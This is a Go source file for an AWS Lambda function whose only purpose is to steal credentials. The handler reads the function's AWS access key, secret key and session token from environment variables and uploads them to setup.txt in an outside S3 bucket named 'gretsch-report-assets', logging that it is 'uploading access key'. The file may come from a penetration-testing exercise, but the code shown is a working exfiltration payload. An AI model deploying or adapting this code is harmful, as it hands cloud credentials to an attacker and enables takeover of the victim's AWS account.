package main

import (
	"context"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"github.com/aws/aws-lambda-go/lambda"
)

const S3BUCKET = "gretsch-report-assets"

type MyEvent struct {
	Name string `json:"name"`
}

func uploadData(client *http.Client, url string, data string) error {
	req, err := http.NewRequest("PUT", url, strings.NewReader(data))
	req.Header.Add("x-amz-acl", "bucket-owner-full-control")
	_, err = client.Do(req)
	return err
}

func HandleRequest(ctx context.Context, name MyEvent) (string, error) {
	client := &http.Client{}
	respURL := fmt.Sprintf("https://%s.s3.amazonaws.com/setup.txt", S3BUCKET)
	accessKey := fmt.Sprintf(`
AWS_ACCESS_KEY_ID=%s
AWS_SECRET_ACCESS_KEY=%s
AWS_SESSION_TOKEN=%s"`,
		os.Getenv("AWS_ACCESS_KEY_ID"),
		os.Getenv("AWS_SECRET_ACCESS_KEY"),
		os.Getenv("AWS_SESSION_TOKEN"),
	)
	log.Printf("Uploading access key to S3 bucket\n")
	uploadData(client, respURL, accessKey)
	return "", nil
}

func main() {
	lambda.Start(HandleRequest)
}
